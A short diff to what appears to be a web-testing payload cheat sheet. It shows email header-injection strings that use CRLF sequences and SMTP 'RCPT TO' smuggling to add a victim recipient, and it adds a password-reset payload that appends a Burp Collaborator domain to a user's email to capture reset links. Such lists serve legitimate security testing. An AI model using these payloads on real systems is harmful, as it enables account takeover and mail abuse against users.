@@ -72,7 +72,10 @@ victim&email=attacker@example.com
 
 "%0d%0aContent-Lenght:%200@0d%0a%0d%0a"@example.com"recipient@test.com>\r\nRCPT TO:<victim+"@test.com
 ```
-
+#Password Reset:
+```
+reset userpassword: user@email.com.burpcolaborator.com
+```
 # Top 25 LFI parameters
 
 ```
